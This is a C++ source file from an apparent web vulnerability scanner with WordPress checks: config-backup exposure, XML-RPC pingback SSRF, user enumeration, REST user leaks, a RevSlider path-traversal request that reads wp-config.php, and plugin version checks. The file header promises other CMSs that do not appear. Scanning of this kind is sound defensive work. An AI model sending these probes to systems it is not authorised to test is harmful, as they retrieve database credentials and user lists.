/// @file scanners/cms_specific.cpp
/// @brief CMS-specific vulnerability scanners targeting WordPress, Drupal,
///        Joomla, Laravel, and Django with strict content validation.
#include "scanner_base.hpp"

namespace apex {
namespace {

// ============================================================================
// WordPress Scanners
// ============================================================================

/// WordPress wp-config.php.bak exposure check.
std::vector<Finding> scan_wp_config_backup(const Config &, HttpClient &http,
                                           const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> backup_paths = {
      "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php.save",
      "/wp-config.php.swp", "/wp-config.php~", "/wp-config.bak",
  };

  for (const auto &path : backup_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 &&
        resp.body.find("<?php") != std::string::npos &&
        resp.body.find("DB_PASSWORD") != std::string::npos &&
        resp.body.find("DB_HOST") != std::string::npos) {
      findings.push_back({"WP Config Backup Exposed", "critical", base + path,
                          "WordPress wp-config backup contains database credentials "
                          "(DB_PASSWORD, DB_HOST found in PHP source)",
                          "", "", ""});
      break;
    }
  }
  return findings;
}

/// WordPress xmlrpc.php abuse detection.
std::vector<Finding> scan_wp_xmlrpc_abuse(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto resp = http.post(base + "/xmlrpc.php",
      "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods"
      "</methodName><params></params></methodCall>",
      "text/xml");

  if (resp.status_code == 200 &&
      resp.body.find("<methodResponse>") != std::string::npos &&
      resp.body.find("wp.getUsersBlogs") != std::string::npos) {
    findings.push_back({"WP XMLRPC Enabled", "medium", base + "/xmlrpc.php",
                        "WordPress XML-RPC accepts method calls — brute force "
                        "and SSRF via pingback possible (system.listMethods confirmed)",
                        "", "", ""});

    // Check pingback specifically for SSRF
    auto ping = http.post(base + "/xmlrpc.php",
        "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping"
        "</methodName><params><param><value><string>http://127.0.0.1</string>"
        "</value></param><param><value><string>" + base + "/?p=1</string>"
        "</value></param></params></methodCall>",
        "text/xml");
    if (ping.status_code == 200 &&
        ping.body.find("<fault>") == std::string::npos) {
      findings.push_back({"WP XMLRPC Pingback SSRF", "high", base + "/xmlrpc.php",
                          "XML-RPC pingback.ping accepted without fault — "
                          "server-side request forgery possible",
                          "", "", ""});
    }
  }
  return findings;
}

/// WordPress user enumeration via ?author=N.
std::vector<Finding> scan_wp_user_enum(const Config &, HttpClient &http,
                                       const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  for (int i = 1; i <= 5; ++i) {
    auto resp = http.get(base + "/?author=" + std::to_string(i));
    // WordPress redirects to /author/username/ on valid authors
    if ((resp.status_code == 301 || resp.status_code == 302) &&
        resp.headers.count("location") &&
        resp.headers.at("location").find("/author/") != std::string::npos) {
      findings.push_back({"WP User Enumeration", "medium", base + "/?author=" + std::to_string(i),
                          "WordPress exposes usernames via author parameter redirect "
                          "(Location header contains /author/<username>)",
                          "", "", ""});
      break;
    }
    // Some themes show author archive directly
    if (resp.status_code == 200 &&
        resp.body.find("author-") != std::string::npos &&
        resp.body.find("posts by") != std::string::npos) {
      findings.push_back({"WP User Enumeration", "medium", base + "/?author=" + std::to_string(i),
                          "WordPress author archive reveals username in page content",
                          "", "", ""});
      break;
    }
  }
  return findings;
}

/// WordPress REST API user leak.
std::vector<Finding> scan_wp_rest_user_leak(const Config &, HttpClient &http,
                                            const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto resp = http.get(base + "/wp-json/wp/v2/users");
  if (resp.status_code == 200 &&
      resp.body.find("\"slug\"") != std::string::npos &&
      resp.body.find("\"name\"") != std::string::npos &&
      resp.body.find("\"id\"") != std::string::npos &&
      resp.body.front() == '[') {
    findings.push_back({"WP REST API User Leak", "medium",
                        base + "/wp-json/wp/v2/users",
                        "WordPress REST API exposes user list with slugs and names "
                        "(JSON array with id, name, slug fields confirmed)",
                        "", "", ""});
  }
  return findings;
}

/// WordPress plugin vulnerability checks.
std::vector<Finding> scan_wp_plugin_vulns(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // RevSlider arbitrary file download (CVE-2014-9734)
  auto revslider = http.get(base +
      "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php");
  if (revslider.status_code == 200 &&
      revslider.body.find("<?php") != std::string::npos &&
      revslider.body.find("DB_PASSWORD") != std::string::npos) {
    findings.push_back({"WP RevSlider File Download", "critical",
                        base + "/wp-admin/admin-ajax.php?action=revslider_show_image",
                        "RevSlider plugin allows arbitrary file download — "
                        "wp-config.php content retrieved (CVE-2014-9734)",
                        "CVE-2014-9734", "", ""});
  }

  // Contact Form 7 unrestricted file upload check
  auto cf7_readme = http.get(base + "/wp-content/plugins/contact-form-7/readme.txt");
  if (cf7_readme.status_code == 200 &&
      cf7_readme.body.find("Contact Form 7") != std::string::npos &&
      cf7_readme.body.find("Stable tag:") != std::string::npos) {
    // Extract version and check if vulnerable (< 5.3.2)
    std::regex ver_re(R"(Stable tag:\s*(\d+\.\d+\.?\d*))");
    std::smatch match;
    if (std::regex_search(cf7_readme.body, match, ver_re)) {
      std::string version = match[1].str();
      // Versions < 5.3.2 have unrestricted upload CVE-2020-35489
      if (version < "5.3.2") {
        findings.push_back({"WP CF7 Upload Vuln", "high",
                            base + "/wp-content/plugins/contact-form-7/readme.txt",
                            "Contact Form 7 version " + version + " vulnerable to "
                            "unrestricted file upload (CVE-2020-35489, fixed in 5.3.2)",
                            "CVE-2020-35489", "", ""});
      }
    }
  }

  return findings;
}

/// WordPress wp-cron.php DoS check.
std::vector<Finding> scan_wp_cron_dos(const Config &, HttpClient &http,
                                      const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  auto resp = http.get(base + "/wp-cron.php");
  // wp-cron.php returns 200 with empty or minimal body when accessible
  if (resp.status_code == 200 && resp.body.size() < 100 &&
      resp.body.find("404") == std::string::npos &&
      resp.body.find("403") == std::string::npos) {
    // Verify it's actually WordPress by checking for wp-login
    auto verify = http.get(base + "/wp-login.php");
    if (verify.status_code == 200 &&
        verify.body.find("wp-login") != std::string::npos) {
      findings.push_back({"WP Cron DoS", "low", base + "/wp-cron.php",
                          "WordPress wp-cron.php publicly accessible — "
                          "can be abused for application-level DoS by triggering "
                          "resource-intensive scheduled tasks repeatedly",
                          "", "", ""});
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_cms_specific_scanners() {
  return {
      {"WP Config Backup", scan_wp_config_backup},
      {"WP XMLRPC Abuse", scan_wp_xmlrpc_abuse},
      {"WP User Enum", scan_wp_user_enum},
      {"WP REST User Leak", scan_wp_rest_user_leak},
      {"WP Plugin Vulns", scan_wp_plugin_vulns},
      {"WP Cron DoS", scan_wp_cron_dos},
  };
}

} // namespace apex
